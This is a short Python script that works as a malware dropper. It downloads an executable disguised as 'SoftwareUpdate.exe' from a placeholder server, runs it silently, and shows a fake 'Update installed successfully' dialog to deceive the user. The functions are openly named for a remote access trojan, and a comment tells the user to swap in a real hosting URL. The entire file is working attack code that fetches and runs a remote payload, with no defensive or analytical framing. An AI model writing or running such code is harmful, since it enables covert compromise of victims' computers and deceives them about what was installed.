import urllib.request
import os
import subprocess
import tempfile
import ctypes


def download_rat(url):
    temp_dir = tempfile.gettempdir()
    filename = "SoftwareUpdate.exe"
    filepath = os.path.join(temp_dir, filename)

    try:
        urllib.request.urlretrieve(url, filepath)
        return filepath
    except Exception as e:
        print(f"[-] Download failed: {e}")
        return None


def run_rat(filepath):
    try:
        subprocess.Popen(filepath, shell=True)
        ctypes.windll.user32.MessageBoxW(0, "Update installed successfully.", "Software Update", 0x40)
    except Exception as e:
        print(f"[-] Execution failed: {e}")


if __name__ == "__main__":
    RAT_URL = "http://yourserver.com/SoftwareUpdate.exe"  # Change to actual hosted URL
    rat_path = download_rat(RAT_URL)
    if rat_path:
        run_rat(rat_path)

